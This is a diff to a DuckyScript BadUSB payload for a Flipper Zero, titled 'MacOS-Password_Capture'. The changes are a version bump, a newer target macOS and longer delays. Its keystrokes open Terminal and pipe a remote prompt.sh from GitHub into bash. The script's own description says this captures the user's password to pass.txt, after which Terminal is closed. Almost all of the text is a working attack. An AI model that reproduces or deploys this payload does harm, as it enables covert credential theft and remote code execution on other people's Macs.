@@ -1,17 +1,17 @@
 REM       MacOS-Password_Capture
-REM       Version 1.0
-REM       OS: macOS 10.4 - (Present)
+REM       Version 1.1
+REM       OS: macOS 13 (Ventura) - Present
 REM       Author: NateW
 REM       Requirements: Any DuckyScript Capable Device. In my case, I am building for a FlipperZero.
 REM       Description: Launches terminal, runs prompt.sh, saves output to pass.txt, 
 DELAY 200
 GUI SPACE
-DELAY 500
+DELAY 800
 STRING Terminal
-DELAY 500
+DELAY 1000
 ENTER
-DELAY 500
+DELAY 1500
 STRING curl -fsSL https://raw.githubusercontent.com/nwhistler/flipper-tools/master/badusb/MacOS/password-prompt/prompt.sh | bash
 ENTER
-DELAY 4000
+DELAY 6000
 GUI q
